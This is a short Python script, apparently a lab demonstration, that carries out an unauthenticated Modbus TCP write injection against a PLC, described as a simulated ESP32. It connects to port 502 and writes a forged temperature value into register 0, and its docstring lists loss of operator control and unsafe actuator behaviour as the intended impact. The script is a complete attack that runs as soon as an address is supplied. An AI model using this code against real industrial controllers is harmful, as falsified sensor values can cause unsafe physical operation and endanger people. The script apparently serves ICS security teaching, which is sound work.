from pyModbusTCP.client import ModbusClient

"""
Modbus TCP Write Injection Attack
--------------------------------
This script demonstrates an unauthorized Modbus write operation
targeting a simulated PLC (ESP32).

Impact:
- Integrity violation
- Loss of operator control
- Unsafe actuator behavior
"""

# PLC IP address and Modbus TCP port
PLC_IP = ""
MODBUS_PORT = 502

# Create Modbus client
client = ModbusClient(host=PLC_IP, port=MODBUS_PORT, auto_open=False)

# Attempt to connect to the PLC
if client.open():
    print("[+] ATTACK STARTED: Modbus Write Single Register")

    # Write a fake high temperature value into register 0
    # This simulates a manipulated sensor reading
    client.write_single_register(0, 49)  # 49°C injected

    print("[+] Injection complete: Malicious values sent to PLC")

    # Close connection
    client.close()
else:
    print("[-] Connection failed: PLC unreachable")

